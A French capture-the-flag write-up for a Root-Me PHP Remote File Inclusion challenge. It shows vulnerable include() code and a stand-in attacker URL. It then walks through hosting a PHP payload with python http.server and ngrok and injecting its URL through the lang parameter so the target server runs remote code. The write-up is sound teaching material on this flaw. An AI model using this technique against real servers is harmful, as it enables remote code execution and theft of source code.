## Ca fait quoi “include” en PHP ?

En PHP, tu peux “coller” un fichier dans un autre au moment de l’exécution :

````
include("header.php");
include($page);         // <- $page peut venir de l'utilisateur (dangereux)
require("config.php");

````
## La difference entre LFI et RFI

LFI (Local File Inclusion) : On arrive à inclure un fichier local du serveur (ex: /etc/passwd, config.php, logs…).

RFI (Remote File Inclusion) : On arrive à inclure un fichier distant via une URL (ex: http://attacker.com/shell.txt).

## Le chall

<img width="888" height="44" alt="image" src="https://github.com/user-attachments/assets/a5c2d12e-3266-49bc-b655-643390b4819e" />

D'apres l'erreur on peut deviner le code derriére:

include($_GET['lang'] . "_lang.php");


Pour une RFI, on ne peut pas juste inventer du code dans l’URL.

Il faut :

un fichier PHP

accessible depuis Internet

que le serveur Root-Me puisse télécharger et inclure

D’où la nécessité de créer notre propre serveur web, on utilise un serveur très simple, suffisant pour le challenge

`python -m http.server 8000
`
Ca va nous créer un serveur HTTP local , sert tout les fichiers du dossier courant, sur le port 8000.
Dans ce dossier on créer un fichier .php qui va afficher index.php

`echo show_source('/challenge/web-serveur/ch13/index.php') ; `

Le probléme etant que notre serveur est local , le serveur root-me ne peux pas accéder à notre machine

On va donc utiliser `ngrok` qui permet d'exposer un port local via un URL publique HTTPS accesible depuis internet

On fait donc

`.\ngrok.exe http 8000 `

ngrok nous fournit une url du type `https://e458605e8045.ngrok-free.app ` ou toute requete vers cette url est redirigée vers `http://localhost:8000 ` 

Donc root me pourra acceder a nos fichiers


<img width="699" height="373" alt="image" src="https://github.com/user-attachments/assets/85e1a565-5c99-4f25-ae2f-606b5038ecb4" />


## Ce qu'il se passe

Quand on appelle l’URL du challenge avec :

`?lang=https://e458605e8045.ngrok-free.app/exploit `


Le serveur Root-Me reçoit la requête ==> Il construit le chemin : `https://e458605e8045.ngrok-free.app/exploit_lang.php `

PHP télécharge ce fichier via HTTP ==> PHP exécute le code du fichier comme s’il était local ==> Le résultat s’affiche dans la page du challenge

Le PHP ne s’exécute pas chez nous, il s’exécute sur le serveur Root-Me.

<img width="620" height="427" alt="image" src="https://github.com/user-attachments/assets/cebd3dba-12d6-4551-aaf4-466b2a420ac4" />

## Conclusion

On comprend maintenant :
pourquoi les include() dynamiques sont dangereux
comment une RFI permet une exécution de code distante
l’importance du filtrage et des configurations PHP (allow_url_include)
